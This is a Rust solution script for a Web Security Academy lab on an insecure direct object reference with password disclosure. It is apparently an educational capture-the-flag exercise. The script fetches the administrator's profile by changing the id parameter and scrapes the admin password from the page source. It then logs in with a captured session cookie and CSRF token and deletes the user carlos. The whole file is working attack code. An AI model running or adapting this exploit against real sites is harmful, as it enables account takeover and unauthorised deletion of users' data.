/***************************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 5/9/2023
*
* Lab: User ID controlled by request parameter with password disclosure
*
* Steps: 1. Fetch administrator page via URL id parameter
*        2. Extract the password from source code
*        3. Login as administrator
*        4. Delete carlos
*
****************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a2f00c9041179a18123e1cc0010004e.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();

    // fetch administrator profile vi URL id parameter
    print!("{} ", "1. Fetching administrator profile page..".white());
    io::stdout().flush();
    let admin_profile = client
        .get(format!("{url}/my-account?id=administrator"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch administrator profile".red()
        ));
    println!("{}", "OK".green());

    // extract the password from source code
    print!("{} ", "2. Extracting password from source code..".white());
    io::stdout().flush();
    let body = admin_profile.text().unwrap();
    let admin_pass = capture_pattern("name=password value='(.*)'", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the admin password".red()
    ));
    println!("{} => {}", "OK".green(), admin_pass.yellow());

    // fetch login page to get valid session csrf token
    print!(
        "{} ",
        "3. Fetching login page to get valid session and csrf token..".white()
    );
    io::stdout().flush();
    let get_login = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch login page".red()));
    let session = extract_session_cookie(get_login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
    let csrf = extract_csrf(get_login).expect(&format!("{}", "[!] Failed extract csrf".red()));
    println!("{}", "OK".green());

    // login as admin
    print!("{} ", "4. Logging in as administrator..".white());
    io::stdout().flush();
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", &admin_pass),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as admin".red()));
    let new_session = extract_session_cookie(login.headers()).expect(&format!(
        "{}",
        "[!] Failed to extract new session cookie".red()
    ));
    println!("{}", "OK".green());

    // delete carlos
    print!("{} ", "5. Deleting carlos..".white());
    io::stdout().flush();
    let delete_carlos = client
        .get(format!("{url}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={new_session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to delete carlos".red()));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
 * Function used to build the client
 * Return a client that will be used in all subsequent requests
 ********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/*************************************************
 * Function to extract csrf from the response body
 **************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}
